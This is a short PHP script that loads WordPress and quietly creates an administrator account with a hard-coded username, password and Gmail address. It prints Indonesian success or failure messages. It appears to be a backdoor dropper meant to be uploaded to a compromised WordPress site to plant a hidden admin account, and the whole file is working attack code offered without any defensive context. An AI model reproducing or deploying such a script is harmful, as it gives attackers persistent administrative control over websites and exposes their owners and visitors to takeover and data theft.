<?php
require_once('wp-load.php');

$username = 'RIZAsalim';
$password = 'Asalammm123@';
$email = 'ddrzsql@gmail.com';

if (!username_exists($username) && !email_exists($email)) {
    $user_id = wp_create_user($username, $password, $email);
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    echo "✅ AKUN WP BERHASIL DI BUAT: <strong>$username</strong><br>Silakan login ke /wp-admin";
} else {
    echo "❌ GAGAL MEMBUAT AKUN WP BARU.";
}
?>